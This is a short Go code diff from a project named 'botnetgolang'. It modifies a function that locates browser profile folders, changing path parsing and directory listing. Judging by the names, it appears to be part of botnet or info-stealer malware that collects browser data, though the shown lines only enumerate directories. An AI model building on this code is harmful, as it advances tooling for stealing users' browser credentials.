@@ -2,9 +2,12 @@ package internal
 
 import (
 	"botnetgolang/internal/model"
+	"botnetgolang/internal/pkg"
+	"fmt"
 	"io/ioutil"
 	"os"
 	"path/filepath"
+	"strings"
 )
 
 var jsonData []interface{}
@@ -16,7 +19,8 @@ func FunGetProfile(browser model.BrowserPaths) map[string]interface{} {
 	if ppp == "" {
 		ppp = os.Getenv("HOME")
 	}
-	ppp = filepath.Dir(ppp)
+	part := strings.Split(ppp, "\\AppData")
+	ppp = part[0]
 
 	jsonData = append(jsonData, filepath.Join(ppp, "fffff"))
 
@@ -29,15 +33,15 @@ func FunGetProfile(browser model.BrowserPaths) map[string]interface{} {
 	}
 
 	alls := make([]string, 0)
-	err = filepath.Walk(pathfolderD, func(path string, info os.FileInfo, err error) error {
-		if err != nil {
-			return err
+	if paths, err := pkg.GetDirectoriesV2(pathfolderD); err != nil {
+		fmt.Print("loi")
+	} else {
+		for _, value := range paths {
+			alls = append(alls, value)
 		}
-		if info.IsDir() {
-			alls = append(alls, path)
-		}
-		return nil
-	})
+
+	}
+
 	if err != nil {
 		panic(err)
 	}
